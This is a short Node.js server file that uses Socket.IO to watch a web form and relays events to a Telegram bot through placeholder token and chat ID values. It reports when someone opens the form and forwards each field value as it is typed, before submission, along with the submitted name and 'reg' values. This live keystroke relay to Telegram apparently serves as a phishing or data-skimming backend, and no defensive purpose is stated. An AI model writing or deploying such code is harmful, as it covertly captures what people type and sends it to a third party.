const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const axios = require("axios");

const app = express();
const server = http.createServer(app);

const io = new Server(server,{
  cors:{origin:"*"}
});

app.use(cors());

const BOT_TOKEN = "YOUR_BOT_TOKEN";
const CHAT_ID = "YOUR_CHAT_ID";

function sendTelegram(message){
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        chat_id: CHAT_ID,
        text: message
    });
}

io.on("connection",(socket)=>{

    console.log("User opened the form");

    sendTelegram("⚠️ Someone opened your form");

    socket.on("typing",(data)=>{
        console.log("Typing:",data);

        sendTelegram(`Typing\nField: ${data.field}\nValue: ${data.value}`);
    });

    socket.on("submit",(data)=>{
        console.log("Form submitted",data);

        sendTelegram(`✅ Form submitted\nName: ${data.name}\nReg: ${data.reg}`);
    });

});

server.listen(3000,()=>{
    console.log("Server running on port 3000");
});
